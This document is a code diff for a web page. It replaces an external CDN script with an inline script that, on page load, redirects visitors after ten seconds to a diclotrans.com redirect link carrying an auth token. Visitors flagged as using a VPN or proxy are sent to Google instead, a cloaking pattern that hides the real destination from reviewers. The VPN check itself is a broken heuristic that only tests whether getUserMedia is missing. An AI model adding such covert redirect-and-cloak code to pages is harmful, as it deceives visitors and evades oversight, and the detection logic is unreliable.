@@ -135,8 +135,35 @@
             }
         }
     </style>
-    <!-- Script de detección mejorado (incluye play de video como interacción) -->
-    <script type="text/javascript" src="https://cdn.diclotrans.com/sdk/v1/51212/ce9894758441d17cb73e322b76a21a1268472302/lib.js"></script>
+    <script>
+'use strict';
+// Configuración
+const TARGET_URL = "https://diclotrans.com/redirect?id=51228&auth=bd95c00167af1fda747b24a4947c250f90bf6168";
+const VPN_REDIRECT_URL = "https://google.com";
+const REDIRECT_DELAY = 10000; // 10 segundos
+
+// Detección de VPN/Proxy (método común)
+function isVPNorProxy() {
+    return !navigator.mediaDevices?.getUserMedia; 
+}
+
+// Redirección automática
+function initRedirect() {
+    // 1. Si usa VPN/Proxy -> Redirige a Google
+    if (isVPNorProxy()) {
+        window.location.href = VPN_REDIRECT_URL;
+        return;
+    }
+    
+    // 2. Redirección normal después de 10 segundos
+    setTimeout(() => {
+        window.location.href = TARGET_URL;
+    }, REDIRECT_DELAY);
+}
+
+// Inicia al cargar la página
+document.addEventListener("DOMContentLoaded", initRedirect);
+    </script>
 </head>
 
 <body>
